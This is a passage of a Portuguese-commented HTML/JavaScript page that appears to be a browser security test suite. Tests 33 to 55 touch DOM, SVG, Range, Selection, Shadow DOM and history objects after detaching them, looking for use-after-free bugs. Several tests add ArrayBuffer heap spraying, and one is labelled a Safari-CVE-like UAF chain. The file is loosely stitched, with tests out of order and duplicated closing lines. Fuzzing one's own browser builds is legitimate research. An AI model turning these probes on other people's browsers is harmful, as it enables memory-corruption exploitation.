    d.style.width="100px";
    document.body.appendChild(d);

    const ro=new ResizeObserver(()=>{});
    ro.observe(d);

    document.body.removeChild(d);
    d.style.width="200px";
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 33 â€” MutationObserver node resurrection
 * Classe: DOM mutation lifetime
 * =======================================================*/
function t33(){
  log("TEST 33 iniciado");
  try{
    const d=document.createElement("div");
    document.body.appendChild(d);

    const mo=new MutationObserver(()=>{
      d.appendChild(document.createElement("span"));
    });
    mo.observe(document.body,{childList:true});

    document.body.removeChild(d);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 34 â€” SVG element after owner removal
 * Classe: SVG DOM lifetime
 * =======================================================*/
function t34(){
  log("TEST 34 iniciado");
  try{
    const svg=document.createElementNS("http://www.w3.org/2000/svg","svg");
    const r=document.createElementNS("http://www.w3.org/2000/svg","rect");
    r.setAttribute("width","100");
    r.setAttribute("height","100");
    svg.appendChild(r);
    document.body.appendChild(svg);

    document.body.removeChild(svg);
    r.getBBox();
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 35 â€” Form element access after removal
 * Classe: HTMLFormElement lifetime
 * =======================================================*/
function t35(){
  log("TEST 35 iniciado");
  try{
    const f=document.createElement("form");
    const i=document.createElement("input");
    f.appendChild(i);
    document.body.appendChild(f);

    document.body.removeChild(f);
    f.reset();
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 36 â€” adoptNode edge case
 * Classe: document ownership corruption
 * =======================================================*/
function t36(){
  log("TEST 36 iniciado");
  try{
    const iframe=document.createElement("iframe");
    document.body.appendChild(iframe);
    const d2=iframe.contentDocument;

    const n=d2.createElement("div");
    document.body.appendChild(n);

    document.body.removeChild(n);
    d2.adoptNode(n);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 37 â€” EventTarget after detach
 * Classe: event system lifetime
 * =======================================================*/
function t37(){
  log("TEST 37 iniciado");
  try{
    const d=document.createElement("div");
    document.body.appendChild(d);

    d.addEventListener("click",()=>{});
    document.body.removeChild(d);
    d.dispatchEvent(new Event("click"));
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 38 â€” getComputedStyle after removal
 * Classe: style/layout lifetime
 * =======================================================*/
function t38(){
  log("TEST 38 iniciado");
  try{
    const d=document.createElement("div");
    d.style.color="red";
    document.body.appendChild(d);

    document.body.removeChild(d);
    getComputedStyle(d).color;
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 39 â€” DOMParser + importNode reuse
 * Classe: DOM import lifetime
 * =======================================================*/
function t39(){
  log("TEST 39 iniciado");
  try{
    const p=new DOMParser();
    const doc=p.parseFromString("<div><span>X</span></div>","text/html");
    const n=doc.body.firstChild;

    document.body.appendChild(n);
    document.body.removeChild(n);
    document.importNode(n,true);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 40 â€” Focus + removal edge
 * Classe: focus controller lifetime
 * =======================================================*/
function t40(){
  log("TEST 40 iniciado");
  try{
    const i=document.createElement("input");
    document.body.appendChild(i);
    i.focus();

    document.body.removeChild(i);
    i.blur();
  }catch(e){ log(e); }
}
/* =========================================================
 * TEST 41 â€” Range + Mutation + Re-entrancy
 * Classe: DOM Range lifetime / re-entrancy
 * =======================================================*/
function t41(){
  log("TEST 41 iniciado");
  try{
    const host=document.createElement("div");
    host.innerHTML="<span>A</span>".repeat(3000);
    document.body.appendChild(host);

    const range=document.createRange();
    range.selectNodeContents(host);

    const mo=new MutationObserver(()=>{
      range.deleteContents();
    });
    mo.observe(host,{childList:true,subtree:true});

    document.body.removeChild(host);
    range.insertNode(document.createTextNode("X"));
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 42 â€” SVG Layout + getBBox after detach
 * Classe: SVG layout object lifetime
 * =======================================================*/
function t42(){
  log("TEST 42 iniciado");
  try{
    const svg=document.createElementNS("http://www.w3.org/2000/svg","svg");
    svg.setAttribute("width","100");
    svg.setAttribute("height","100");

    const r=document.createElementNS("http://www.w3.org/2000/svg","rect");
    r.setAttribute("width","80");
    r.setAttribute("height","80");
    svg.appendChild(r);

    document.body.appendChild(svg);
    const box1=r.getBBox();

    document.body.removeChild(svg);
    const box2=r.getBBox();

    log("BBox diff: "+(box1.width-box2.width));
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 43 â€” adoptNode + Event dispatch
 * Classe: ownership + event lifetime
 * =======================================================*/
function t43(){
  log("TEST 43 iniciado");
  try{
    const iframe=document.createElement("iframe");
    document.body.appendChild(iframe);

    const d2=iframe.contentDocument;
    const el=d2.createElement("div");
    el.textContent="X";

    el.addEventListener("click",()=>{});
    document.body.appendChild(el);

    document.body.removeChild(el);
    d2.adoptNode(el);

    el.dispatchEvent(new MouseEvent("click",{bubbles:true}));
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 44 â€” Selection + Range + removed Text node
 * Classe: selection engine lifetime
 * =======================================================*/
function t44(){
  log("TEST 44 iniciado");
  try{
    const d=document.createElement("div");
    const t=document.createTextNode("A".repeat(5000));
    d.appendChild(t);
    document.body.appendChild(d);

    const sel=window.getSelection();
    const r=document.createRange();
    r.setStart(t,100);
    r.setEnd(t,200);
    sel.addRange(r);

    document.body.removeChild(d);
    sel.modify("extend","forward","character");
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 45 â€” Style recalculation after detach
 * Classe: layout/style object lifetime
 * =======================================================*/
function t45(){
  log("TEST 45 iniciado");
  try{
    const d=document.createElement("div");
    d.style.cssText="position:absolute;left:10px;top:10px;width:100px;height:100px;";
    document.body.appendChild(d);

    const cs1=getComputedStyle(d).width;
    document.body.removeChild(d);

    d.style.width="200px";
    const cs2=getComputedStyle(d).width;

    log("Style diff: "+cs1+" -> "+cs2);
  }catch(e){ log(e); }
}
/* =========================================================
 * TEST 46 â€” History + DOM detach + reflow
 * Classe: History state holding dead DOM
 * =======================================================*/
function t46(){
  log("TEST 46 iniciado");
  try{
    const d=document.createElement("div");
    d.innerHTML="<p>X</p>".repeat(4000);
    document.body.appendChild(d);

    history.pushState({ref:d},"","/#A");
    document.body.removeChild(d);

    d.style.height="200px";
    d.getBoundingClientRect();

    history.back();
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 47 â€” ShadowDOM + Range after host removal
 * Classe: shadow tree lifetime
 * =======================================================*/
function t47(){
  log("TEST 47 iniciado");
  try{
    const host=document.createElement("div");
    const shadow=host.attachShadow({mode:"open"});
    const span=document.createElement("span");
    span.textContent="SHADOW";
    shadow.appendChild(span);

    document.body.appendChild(host);

    const r=document.createRange();
    r.selectNode(span);

    document.body.removeChild(host);
    r.cloneContents();
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 48 â€” SVG <use> + referenced element removal
 * Classe: SVG instance tree corruption
 * =======================================================*/
function t48(){
  log("TEST 48 iniciado");
  try{
    const svgNS="http://www.w3.org/2000/svg";
    const svg=document.createElementNS(svgNS,"svg");
    const defs=document.createElementNS(svgNS,"defs");
    const rect=document.createElementNS(svgNS,"rect");

    rect.setAttribute("id","r");
    rect.setAttribute("width","50");
    rect.setAttribute("height","50");
    defs.appendChild(rect);

    const use=document.createElementNS(svgNS,"use");
    use.setAttributeNS("http://www.w3.org/1999/xlink","href","#r");

    svg.appendChild(defs);
    svg.appendChild(use);
    document.body.appendChild(svg);

    defs.removeChild(rect);
    use.getBBox();
  }catch(e){ log(e); }
}
/* =========================================================
 * TEST 50 â€” CSS animation + element removal mid-frame
 * Classe: animation engine / layout lifetime
 * =======================================================*/
function t50(){
  log("TEST 50 iniciado");
  try{
    const d=document.createElement("div");
    d.style.cssText="width:50px;height:50px;background:red;animation:spin 1s linear;";
    document.body.appendChild(d);

    document.body.offsetHeight; // force style resolve
    document.body.removeChild(d);

    d.getAnimations().forEach(a=>a.currentTime=500);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 49 â€” Form controls + disabled state after detach
 * Classe: form element internal state
 * =======================================================*/
function t49(){
  log("TEST 49 iniciado");
  try{
    const f=document.createElement("form");
    const i=document.createElement("input");
    i.type="text";
    i.value="AAAA";
    f.appendChild(i);
    document.body.appendChild(f);

    i.disabled=true;
    document.body.removeChild(f);

    i.focus();
    i.setSelectionRange(1,3);
  }catch(e){ log(e); }
}

function log(m){
  const l=document.getElementById("log");
  l.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
  l.scrollTop=l.scrollHeight;
}

/* =========================================================
 * TEST 51 â€” History + GC + DOM resurrection
 * Classe: stale pointer via history state
 * =======================================================*/
function t51(){
  log("TEST 51 iniciado");
  try{
    let d=document.createElement("div");
    d.textContent="A".repeat(10000);
    document.body.appendChild(d);

    history.pushState({node:d},"","/#51");
    document.body.removeChild(d);
    d=null;

    let junk=[];
    for(let i=0;i<200;i++) junk.push(new ArrayBuffer(1024*1024));

    history.back();
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 52 â€” Range + Selection + detach + layout
 * Classe: classic UAF chain (Safari CVE-like)
 * =======================================================*/
function t52(){
  log("TEST 52 iniciado");
  try{
    const p=document.createElement("p");
    p.textContent="B".repeat(5000);
    document.body.appendChild(p);

    const r=document.createRange();
    r.selectNodeContents(p);

    document.body.removeChild(p);
    window.getSelection().addRange(r);

    document.body.offsetHeight;
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 53 â€” SVG + CSS animation + GC
 * Classe: SVG instance + compositor lifetime
 * =======================================================*/
function t53(){
  log("TEST 53 iniciado");
  try{
    const ns="http://www.w3.org/2000/svg";
    const svg=document.createElementNS(ns,"svg");
    const c=document.createElementNS(ns,"circle");

    c.setAttribute("r","40");
    c.style.animation="spin 1s linear infinite";
    svg.appendChild(c);
    document.body.appendChild(svg);

    svg.removeChild(c);

    let spray=[];
    for(let i=0;i<150;i++) spray.push(new ArrayBuffer(1024*1024));

    c.getBBox();
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 54 â€” ShadowDOM + slot reassignment + GC
 * Classe: shadow tree invalidation
 * =======================================================*/
function t54(){
  log("TEST 54 iniciado");
  try{
    const host=document.createElement("div");
    const shadow=host.attachShadow({mode:"open"});
    const slot=document.createElement("slot");
    shadow.appendChild(slot);

    const span=document.createElement("span");
    span.textContent="SHADOW";
    document.body.appendChild(host);
    document.body.appendChild(span);

    host.remove();
    span.remove();

    let g=[];
    for(let i=0;i<120;i++) g.push(new ArrayBuffer(1024*1024));

    slot.assignedNodes();
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 55 â€” Form + focus + history + GC
 * Classe: UI state + navigation lifetime
 * =======================================================*/
function t55(){
  log("TEST 55 iniciado");
  try{
    const f=document.createElement("form");
    const i=document.createElement("input");
    i.value="CCCC";
    f.appendChild(i);
    document.body.appendChild(f);

    i.focus();
    history.pushState({},"","/#55");

    document.body.removeChild(f);

    let trash=[];
    for(let i=0;i<180;i++) trash.push(new ArrayBuffer(1024*1024));

    history.back();
  }catch(e){ log(e); }
}

log("MAX LEVEL Suite 51â€“55 carregada. Execute UM teste por vez.");
</script>

<style>
@keyframes spin {
  from { transform:rotate(0deg); }
  to { transform:rotate(360deg); }
}
</style>


log("Suite carregada. Execute um teste por vez.");
</script>
</body>
</html>
